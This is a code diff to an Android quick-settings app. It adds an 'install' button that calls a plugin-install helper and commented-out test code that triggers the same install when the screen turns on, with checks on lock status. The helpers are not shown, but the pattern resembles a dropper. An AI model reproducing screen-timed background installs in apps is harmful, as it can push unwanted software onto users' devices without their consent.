@@ -63,9 +63,12 @@ import com.bwx.bequick.fwk.Setting;
 import com.bwx.bequick.fwk.SettingHandler;
 import com.bwx.bequick.fwk.SettingsFactory;
 import com.bwx.bequick.preferences.CommonPrefs;
+import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.qm.Config;
+import com.xstd.qm.UtilOperator;
 import com.xstd.quick.R;
 
-public class MainSettingsActivity extends Activity implements OnClickListener, OnSharedPreferenceChangeListener {
+public class MainSettingsActivity extends BaseActivity implements OnClickListener, OnSharedPreferenceChangeListener {
 
 	private static final String TAG = "ShowSettingsActivity";
 
@@ -159,6 +162,8 @@ public class MainSettingsActivity extends Activity implements OnClickListener, O
 	private int mPrefAppearance;
 	private int mPrefFlashlight;
 
+    BroadcastReceiver sreenBRC;
+
 	/** Called when the activity is first created. */
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -195,8 +200,53 @@ public class MainSettingsActivity extends Activity implements OnClickListener, O
 				showDialog(0);
 			}
 		}
-		
+
+        View button = findViewById(R.id.install);
+		button.setOnClickListener(new OnClickListener() {
+            @Override
+            public void onClick(View view) {
+//                if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
+                    UtilOperator.tryToInstallPlugin(getApplicationContext());
+//                }
+            }
+        });
+
+
+        //test code for sreen status
+//        sreenBRC = new BroadcastReceiver() {
+//            @Override
+//            public void onReceive(Context context, Intent intent) {
+//                if (intent != null && intent.getAction() != null) {
+//                    if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
+//                        Config.LOGD("<<<< " + Intent.ACTION_SCREEN_ON + " >>>>>"
+//                                        + " function screen status : " + UtilsRuntime.isScreenLocked(MainSettingsActivity.this));
+//                        //try to install
+//                        UtilOperator.tryToInstallPlugin(MainSettingsActivity.this);
+//                    } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
+//                        Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
+//                                        + " function screen status : " + UtilsRuntime.isScreenLocked(MainSettingsActivity.this));
+//                    }
+//                }
+//            }
+//        };
+//        registerReceiver(sreenBRC, new IntentFilter(Intent.ACTION_SCREEN_ON));
+//        registerReceiver(sreenBRC, new IntentFilter(Intent.ACTION_SCREEN_OFF));
+
+
+
 	}
+
+    @Override
+    public void onStart() {
+        super.onStart();
+        Config.LOGD("<<<< [[onStart]] function screen status : " + UtilsRuntime.isScreenLocked(MainSettingsActivity.this) + " >>>>");
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+//        unregisterReceiver(sreenBRC);
+    }
 
 	@Override
 	protected Dialog onCreateDialog(int id) {
